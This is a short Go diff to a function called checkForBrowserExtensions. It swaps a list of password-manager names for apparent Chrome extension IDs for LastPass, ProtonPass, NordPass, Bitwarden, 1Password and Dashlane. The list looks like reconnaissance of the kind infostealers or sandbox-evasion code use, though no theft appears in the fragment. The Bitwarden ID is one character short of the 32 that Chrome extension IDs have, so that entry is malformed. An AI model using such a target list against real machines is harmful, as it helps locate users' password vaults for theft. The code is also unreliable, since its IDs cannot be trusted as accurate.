@@ -64,13 +64,12 @@ func checkForBrowserExtensions() bool {
 	}
 
 	browserExtensions := []string{
-		"LastPass",
-		"ProtonPass",
-		"NordPass",
-		"Bitwarden",
-		"1Password",
-		"KeePass",
-		"Dashlane",
+		"hdokiejnpimakedhajhdlcegeplioahd", // LastPass
+		"ghmbeldphafepmbegfdlkpapadhbakde", // ProtonPass
+		"eiaeiblijfjekdanodkjadfinkhbfgcd", // nordpass
+		"nngceckbapebfimnlniiiahkandclbl",  // bitwarden
+		"aeblfdkhhhdcdjpifhhbdiojplfjncoa", // 1password
+		"fdjamakpfbbddfjaooikfcpapjohcfmg", // dashlane
 	}
 
 	for _, extPath := range extensionPaths {
